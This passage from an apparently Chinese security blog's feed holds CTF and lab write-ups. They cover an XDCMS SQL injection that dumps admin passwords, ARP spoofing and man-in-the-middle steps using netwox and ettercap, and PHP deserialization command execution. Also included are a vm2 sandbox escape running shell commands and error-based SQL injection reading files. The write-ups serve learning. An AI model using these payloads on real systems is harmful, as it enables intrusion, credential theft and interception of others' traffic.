userid=9</code></p><p>在xdcms数据库执行利用代码。返回报错信息，在网页上执行利用代码：</p><p><code>56&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p><p>显示注册成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计练习（一）&quot;&gt;&lt;a href=&quot;#代码审计练习（一）&quot; class=&quot;headerlink&quot; title=&quot;代码审计练习（一）&quot;&gt;&lt;/a&gt;代码审计练习（一）&lt;/h1&gt;&lt;h2 id=&quot;XDCMS&quot;&gt;&lt;a href=&quot;#XDCMS&quot; class=&quot;header
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/"/>
    <id>http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/</id>
    <published>2020-05-30T07:43:56.350Z</published>
    <updated>2020-06-01T13:35:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验环境-vmware12-KALI2020-2"><a href="#实验环境-vmware12-KALI2020-2" class="headerlink" title="实验环境 vmware12 + KALI2020.2"></a>实验环境 vmware12 + KALI2020.2</h2><p>一：导入XP系统</p><p>1过程</p><ol><li><p>在 Workstation Pro 中，选择<strong>文件</strong> &gt; <strong>打开</strong>。</p></li><li><p>浏览到 .ovf 或 .ova 文件，然后单击<strong>打开</strong>。</p></li><li><p>键入虚拟机名称，再键入或浏览至虚拟机文件目录，然后单击<strong>导入</strong>。</p><p>Workstation Pro 会执行 OVF 规范一致性和虚拟硬件合规性检查。状态栏中会显示导入进度。</p></li><li><p>如果导入失败，可单击<strong>重试</strong>重新尝试操作，或者单击<strong>取消</strong>以取消导入。</p><p>如果重新尝试导入，Workstation Pro 会放宽 OVF 规范一致性与虚拟硬件合规性检查，但您可能无法使用 Workstation Pro 中的虚拟机。</p></li></ol><h2 id="二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）"><a href="#二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）" class="headerlink" title="二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）"></a>二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）</h2><p>同时关闭XP的防火墙。</p><p>对win10进行设置：</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234440730.png" alt="image-20200529234440730"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234451763.png" alt="image-20200529234451763"></p><h3 id="二（补充）：如果无法点击高级设置。就搜索防火墙"><a href="#二（补充）：如果无法点击高级设置。就搜索防火墙" class="headerlink" title="二（补充）：如果无法点击高级设置。就搜索防火墙"></a>二（补充）：如果无法点击高级设置。就搜索防火墙</h3><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530171703863.png" alt="image-20200530171703863"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234504869.png" alt="image-20200529234504869"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234516814.png" alt="image-20200529234516814"></p><h2 id="三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"><a href="#三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式" class="headerlink" title="三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"></a>三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153718746.png" alt="image-20200530153718746"></h2><p>【按住ctrl左键点击vm8和可以联网的网卡，右键vm8点击桥接。会出现新的网卡。右键新的网络，点击“属性“，找到“IPv4”，打开其”属性“，默认为自动获取IP，改成手动设置，IP填写你局域网中的IP，比如我的可以填写为192.168.31.109（只要符合你们局域网IP范围就可以），子网掩码默认，在默认网关处填写路由器的IP，比如我的是192.168.31.1；】<strong>该步骤是解决win10桥接下无法联网的解决办法，<u>可跳过</u></strong></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530174900133.png" alt="image-20200530174900133"></p><p>默认网关用ipconfig查看。</p><p>【在下方的DNS处，可以填写比较好用的114.114.114.114和223.5.5.5。然后确定。<br>】<em><em>这步骤同上。</em>，若虚拟机有网则不需要</em></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530175305661.png" alt="image-20200530175305661"></p><h2 id="四：修改虚拟机网络配置"><a href="#四：修改虚拟机网络配置" class="headerlink" title="四：修改虚拟机网络配置"></a>四：修改虚拟机网络配置</h2><p>1.打开虚拟网络编辑器</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210737893.png" alt="image-20200601210737893"></p><p>2.</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180640690.png" alt="image-20200530180640690"></p><p>这里的网卡需要设置成本机名字的网卡。比如：AC 9462</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180917529.png" alt="image-20200530180917529"></p><p>3.选择桥接模式</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210915755.png" alt="image-20200601210915755"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154028167.png" alt="image-20200530154028167"></p><p>将XP和kali的设置都设置成桥接模式。如上图。</p><p><strong>要保证虚拟机之间虚拟机主机 主机虚拟机可以互ping，并且在同一网段</strong></p><p><strong>如果都能成功，则修改完成。</strong></p><h2 id="五：安装netwox"><a href="#五：安装netwox" class="headerlink" title="五：安装netwox"></a>五：安装netwox</h2><p>1.sudo vi /etc/apt/sources.list</p><p>2.在后面添加源：</p><pre><code class="text">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><p>3.i是插入。</p><blockquote><p>sudo apt-get update</p><p>sudo apt-get install netwox</p></blockquote><h2 id="五：运行Netwox工具包，对靶机进行假冒源地址"><a href="#五：运行Netwox工具包，对靶机进行假冒源地址" class="headerlink" title="五：运行Netwox工具包，对靶机进行假冒源地址"></a>五：运行Netwox工具包，对靶机进行假冒源地址</h2><p>本机：192.168.31.21</p><p>XP：192.168.31.128</p><p>kali：192.168.31.129</p><p>1—互相ping通，记录mac地址和IP。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132059565.png" alt="image-20200530132059565"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132111925.png" alt="image-20200530132111925"></p><p>2.</p><p>记下kali xp 物理机的 IP和MAC地址。如果显示上图则表示成功。在kali上输入：<strong>每个人输入的不一样，这个终端<u>别关掉</u>它不会出现回显的</strong></p><blockquote><p>sudo netwox 80 “00:0c:29:c8:27:5d”（kali的MAC地址） -i “192.168.31.21”    （win10）//告诉靶机B，靶机C192.168.31.21的MAC地址 00:0c:29:c8:27:5d</p></blockquote><p>3.</p><p>在kali中再打开一个终端sudo wireshark</p><p>切换到XP系统，输入arp -a</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530130418592.png" alt="image-20200530130418592"></p><p>可以看见kali正在欺骗XP（192.168.31.128）win10的mac地址为00:0c:29:c8:27:5d（而实际上这其实是kali的mac地址）</p><p><strong><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530131219459.png" alt="image-20200530131219459"></strong></p><p>可以发现已经欺骗成功了。这个时候XP上ping 192.168.31.21发现无法成功。</p><p><strong>这样就完成了一次简单的ARP欺骗。</strong></p><h2 id="六：ettercap-实现中间人攻击"><a href="#六：ettercap-实现中间人攻击" class="headerlink" title="六：ettercap 实现中间人攻击"></a>六：ettercap 实现中间人攻击</h2><p>1.</p><blockquote><p>sudo ettercap -G(新版ettercap,旧版在下面)</p></blockquote><p>2.首先选择Sniff-&gt;ARP poioning</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154601623.png" alt="image-20200530154601623"></p><p>3.</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154637446.png" alt="image-20200530154637446"></p><p>从我们发现的主机中，选择我们的目标。从<code>Hosts</code>菜单栏中选择</p><p>3.<code>Hosts list</code>。</p><p>4.scan for hosts</p><ol><li>从列表中选择<code>192.168.31.21</code>，并点击<code>Add to Target 1</code>。</li><li>之后选择<code>192.168.31.128，之后点击</code>Add to Target 2`。</li><li>现在我们检查目标：在<code>Targets</code>菜单中，选择<code>Current targets</code>。</li></ol><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154508637.png" alt="image-20200530154508637"></p><p>5.然后点击左上角的箭头开始攻击。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601184923242.png" alt="image-20200601184923242"></p><p>可以发现mac地址已经全部修改为kali的mac地址。</p><p>6.查看wireshark，仔细观察可以看见kali一直在广播对XP和win10进行ARP欺骗。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" alt="image-20200530153450571"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" alt="image-20200530153539587"></p><h2 id="旧版"><a href="#旧版" class="headerlink" title="旧版"></a>旧版</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203006988.png" alt="image-20200530203006988"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203019644.png" alt="image-20200530203019644"></p><p>然后右上角start</p><h2 id="七：使用netwox进行中间人攻击"><a href="#七：使用netwox进行中间人攻击" class="headerlink" title="七：使用netwox进行中间人攻击"></a>七：使用netwox进行中间人攻击</h2><p>将kali的MAC地址伪装成XP，向WIN10发送ARP Reply</p><p>将kali的MAC地址伪装成win10，向XP发送ARP Reply</p><p>一：在kali上开两个窗口分别输入</p><blockquote><p>sudo netwox 80 (kali MAC地址)  -i  “XP’s IP”</p><p>sudo netwox 80 (kali MAC地址)  -i  “Win10’s IP”</p></blockquote><p>二：arp -a(XP)</p><p>查看并记录XP和WIN10的ARP表变化</p><p>三：查看、记录并分析kali、XP和WIN10上wireshark捕获的ARP报文</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" alt="image-20200530153450571"></p><p>可以看见kali不停的播放ARP广播实行欺骗。</p><ul><li><p>当XP发送数据给WIN10时，通过广播ARP 请求包，询问IP(win10)映射的MAC(win10)</p></li><li><p>同一网段的主机都会收到ARP请求包。win10会返回IP(WIN10)–MAC(WIN10)，攻击节点kali会返回IP(WIN10)–MAC(kali)，其他机器不做应答。</p></li><li><p>尽管win10也做出响应，但kali不断发送响应包，导致XP的ARP映射表保存了错误的映射。当xp想WIN10发送数据的时候，将会发送到kali的端口。若kali同时冒充XP和WIN10，则这就构成了中间人攻击。</p></li></ul><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" alt="image-20200530153539587"></p><p>而也可实现互相ping通，则可发现实验是成功的，kali成功的对win10和winXP之间的通信进行了欺骗。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实验环境-vmware12-KALI2020-2&quot;&gt;&lt;a href=&quot;#实验环境-vmware12-KALI2020-2&quot; class=&quot;headerlink&quot; title=&quot;实验环境 vmware12 + KALI2020.2&quot;&gt;&lt;/a&gt;实验环境 vmware1
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/"/>
    <id>http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/</id>
    <published>2020-05-20T10:18:49.067Z</published>
    <updated>2020-05-20T10:18:49.067Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>fuzz一下发现报错信息中有call_user_func()。但是我太菜了绕不过。用payload：</p><blockquote><p>func=file_get_contents&amp;p=index.php</p></blockquote><p>看一下源码</p><pre><code class="php">&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func != &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) &#123;        $func = strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;</code></pre><p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p><pre><code>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</code></pre><p><code>&lt;?php</code><br><code>class Test &#123;</code><br>    <code>var $p = &quot;Y-m-d h:i:s a&quot;;</code><br>    <code>var $func = &quot;date&quot;;</code><br>    <code>function __destruct() &#123;</code><br>        <code>if ($this-&gt;func != &quot;&quot;) &#123;</code><br>            <code>echo gettime($this-&gt;func, $this-&gt;p);</code><br>        <code>&#125;</code><br>    <code>&#125;</code><br><code>&#125;</code></p><p><code>$a = new Test();</code><br><code>$a -&gt; p=&quot;ls ../../../../../&quot;;</code><br><code>$a -&gt; func = &quot;system&quot;;</code><br><code>print_r(urlencode(serialize($a)));</code><br><img src="https://img-blog.csdnimg.cn/20200518171039755.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NoZW5aSUR1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>$a = new Test();</code></p><p> <code>$a -&gt; p=&quot;cat /tmp/flagoefiu4r93&quot;;</code></p><p> <code>$a -&gt; func = &quot;system&quot;; print_r(urlencode(serialize($a)));</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/"/>
    <id>http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/</id>
    <published>2020-05-19T04:34:31.612Z</published>
    <updated>2020-05-19T04:34:31.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>可以看到有一个随机数，如果能够破解随机数就能得到flag，在这里卡了半天也没做出来：</p><?phpinclude 'config.php'; // FLAG is defined in config.phpif (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {  exit("I don't know what you are thinking, but I won't let you read it :)");}if (isset($_GET['source'])) {  highlight_file(basename($_SERVER['PHP_SELF']));  exit();}$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) {  $guess = (string) $_POST['guess'];  if (hash_equals($secret, $guess)) {    $message = 'Congratulations! The flag is: ' . FLAG;  } else {    $message = 'Wrong.';  }}?><!doctype html><html lang="en">  <head>    <meta charset="utf-8">    <title>Can you guess it?</title>  </head>  <body>    <h1>Can you guess it?</h1>    <p>If your guess is correct, I'll give you the flag.</p>    <p><a href="?source">Source</a></p>    <hr><?php if (isset($message)) { ?>    <p><?= $message ?></p><?php } ?>    <form action="index.php" method="POST">      <input type="text" name="guess">      <input type="submit">    </form>  </body></html><p>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法<br>可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</p><pre><code>/config\.php\/*$/i1</code></pre><p>老套路了，可以用%0d之类的来污染绕过，这样仍然访问得到index.php:</p><pre><code>/index.php/config.php/%0d</code></pre><p>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</p><p>但是正则过滤了/config.php/*$/i。<br>从 <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</p><blockquote><p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php<br>var_dump(basename(“config.php/xff”)); // =&gt; config.php</p><p>所以这样就能绕过正则了，payload：</p></blockquote><blockquote><p>/index.php/config.php/%ff?source</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Zer0pts2020-Can-you-guess-it&quot;&gt;&lt;a href=&quot;#Zer0pts2020-Can-you-guess-it&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]Can you guess it?&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/"/>
    <id>http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/</id>
    <published>2020-05-17T02:59:35.162Z</published>
    <updated>2020-05-17T02:59:35.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>最近老遇到js的题目，表示完全不会。</p><p>看网上的wp，是基于node.js的网站，如输入Error().stack 即可报错（同时发现VM沙箱机制）。</p><p>这是网上的payload：</p><pre><code class="javascript">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>但是反引号和${}已经被过滤掉了，</p><pre><code class="javascript">(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre><p>第二种绕过是：使用join来拼接字符串</p><pre><code class="javascript">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HFCTF2020-JustEscape&quot;&gt;&lt;a href=&quot;#HFCTF2020-JustEscape&quot; class=&quot;headerlink&quot; title=&quot;[HFCTF2020]JustEscape&quot;&gt;&lt;/a&gt;[HFCTF2020]JustEscape&lt;/h2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/"/>
    <id>http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/</id>
    <published>2020-05-13T09:24:38.721Z</published>
    <updated>2020-05-13T09:24:38.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><ul><li>解法一<ul><li>[1、error_log结合log_errors自定义错误日志]</li><li>[2、include_path设置包含路径]</li><li>[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]</li><li>[4、# \ 绕过.htaccess中多余字符]</li></ul></li><li>解法二<ul><li>[5、.htaccess配置prce绕过正则匹配]</li></ul></li><li>[解法三]</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XNUCA2019Qualifier-EasyPHP&quot;&gt;&lt;a href=&quot;#XNUCA2019Qualifier-EasyPHP&quot; class=&quot;headerlink&quot; title=&quot;[XNUCA2019Qualifier]EasyPHP&quot;&gt;&lt;/a&gt;[XNUCA2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/"/>
    <id>http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/</id>
    <published>2020-05-06T15:05:46.236Z</published>
    <updated>2020-05-07T01:40:24.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506210636892.png" alt="image-20200506210636892"></p><p>发现敏感信息。</p><p>利用PHP伪协议读取源码</p><p><code>index.php：</code></p><pre><code class="PHP">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file))&#123;    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;        echo(&#39;no way!&#39;);        exit;    &#125;    @include($file);&#125;?&gt;</code></pre><p>这里的正则因为是/i对大小写不敏感所以我没办法绕过。</p><p>search.php</p><pre><code>&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;         $msg = &#39;no sql inject!&#39;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        if(!$row) &#123;            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    &#125; else &#123;        $msg = &quot;æªæ¾å°è®¢å!&quot;;    &#125;&#125;else &#123;    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt;</code></pre><p>index.php中无法实现绕过，考虑使用二次注入。</p><p>会发现查询页面会有回显，修改页面存在报错。通过查询页面可以知道，只有地址存在’。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)<em>#</em></p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506224723491.png" alt="image-20200506224723491"></p><p>利用load_file读取flag.txt</p><blockquote><p>errorXPATH syntax error: ‘~flag{8fbc88cb-5172-4418-b655-f6’</p></blockquote><p>发现显示的不完整。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select right(load_file(‘/flag.txt’),20)),0x7e),1)#</p></blockquote><blockquote><p>errorXPATH syntax error: ‘~-b655-f6bb7aabe0fc} ~’</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/"/>
    <id>http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/</id>
    <published>2020-05-05T11:17:34.924Z</published>
    <updated>2020-05-05T11:17:34.925Z</updated>
    
